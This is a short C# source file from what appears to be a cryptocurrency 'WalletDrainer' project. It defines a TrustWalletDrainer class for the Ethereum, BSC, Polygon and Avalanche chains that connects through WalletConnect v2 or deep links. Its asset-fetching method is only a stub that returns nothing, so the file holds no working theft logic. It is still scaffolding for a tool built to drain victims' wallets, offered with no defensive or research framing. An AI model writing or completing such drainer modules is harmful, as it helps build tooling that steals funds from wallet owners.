using WalletDrainer.Models;

namespace WalletDrainer.Wallets;

public sealed class TrustWalletDrainer : IWalletDrainer
{
    public string WalletName => "Trust Wallet";
    public string[] SupportedChains => ["ethereum", "bsc", "polygon", "avalanche"];

    public async Task<List<WalletAsset>> GetAssets(string address, string chain, CancellationToken ct = default)
    {
        await Task.CompletedTask;
        return [];
    }

    public bool SupportsChain(string chain) =>
        SupportedChains.Contains(chain, StringComparer.OrdinalIgnoreCase);

    public string GetConnectionMethod() => "WalletConnect v2 / Deep Link";
}
